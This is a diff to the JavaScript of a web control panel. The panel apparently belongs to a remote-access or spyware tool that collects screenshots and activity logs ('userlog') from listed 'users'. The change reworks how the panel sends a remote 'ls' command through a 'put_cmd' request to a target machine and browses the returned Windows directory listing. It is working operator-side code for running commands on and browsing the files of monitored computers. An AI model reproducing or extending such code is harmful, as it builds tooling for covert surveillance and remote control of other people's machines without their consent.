@@ -11,6 +11,8 @@ var l_times = [];
 var l_selected = -1;
 var l_screenshots = [];
 var l_dir = l_dir_default;
+var l_dir_update = true;
+var l_dir_data = null;
 var b_screenshots_shown = false;
 
 var $selected_user = null;
@@ -118,13 +120,33 @@ function set_userlog(data) {
 	}
 	$userlog.val(data);
 }
-function set_ls(data) {
 
+function get_ls(index) {
+	if (l_dir_update) {
+		l_dir_update = false;
+		$.ajax({
+			type: 'POST',
+			url: ctrl,
+			cache: false,
+			dataType: 'text',
+			data: {req : 'put_cmd', cmd: 'ls '+l_dir, user: l_users[index]}
+		});
+	}
+	generic_request(index, 'get_ls', function(data) {
+		set_ls(data);
+		log('Fetched ls for ' + l_users[index]);
+	});
+}
+function update_ls() {
 	$ls.empty();
-
-	var files = data.split('\n');
+	
+	var files = l_dir_data.split('\n');
+	var num = 0;
+	
 	for (var i = 0; i < files.length; i++) {
 		var file = files[i].split('|');
+		
+		var fn = file[0];
 
 		if (file[0].indexOf(l_dir) != 0)
 			continue;
@@ -132,18 +154,20 @@ function set_ls(data) {
 		if (file[0].lastIndexOf('\\') > l_dir.length)
 			continue;
 			
-		if (file[0] === l_dir+'.')
-			continue;
-			
-		var up = file[0].indexOf('\\..');
-			
-		if (up >= 0)
-		{
-			file[0] = file[0].substring(0, up);
+		if (file[0] === l_dir+'.') {
 			file[0] = file[0].substring(0, file[0].lastIndexOf('\\'));
+			fn = '[%% Refresh]';
+		} else {
+			var up = file[0].indexOf('\\..');
+			if (up >= 0)
+			{
+				file[0] = file[0].substring(0, up);
+				file[0] = file[0].substring(0, file[0].lastIndexOf('\\'));
+				fn = '[<< Return]';
+			}
 		}
 
-		var $c = $('<div class="ls_f"></div>').text(file[0]);
+		var $c = $('<div class="ls_f"></div>').text(fn);
 		if (file[1] & 16) {
 			$c.addClass('ls_dir');
 			$c.on('click', {
@@ -154,7 +178,21 @@ function set_ls(data) {
 			});
 		}
 		$ls.append($c);
+		
+		num++;
 	}
+	
+	if (num == 0) {
+		get_ls(l_selected);
+	} else {
+		l_dir_update = true;
+	}
+}
+function set_ls(data) {
+
+	l_dir_data = data;
+	
+	update_ls();
 }
 function refresh_users() {
 
@@ -212,8 +250,8 @@ function select_user(index) {
 		view_userlog(index);
 		if (update) {
 			l_dir = l_dir_default;
+			get_ls(index);
 		}
-		get_ls(index);
 	}
 }
 function get_data(index) {
@@ -268,19 +306,6 @@ function clear_userlog(index) {
 		if (l_selected == index) {
 			$userlog.val('');
 		}
-	});
-}
-function get_ls(index) {
-	generic_request(index, 'get_ls', function(data) {
-		set_ls(data);
-		log('Fetched ls for ' + l_users[index]);
-		$.ajax({
-			type: 'POST',
-			url: ctrl,
-			cache: false,
-			dataType: 'text',
-			data: {req : 'put_cmd', cmd: 'ls '+l_dir, user: l_users[index]}
-		});
 	});
 }
 function del_data(index) {
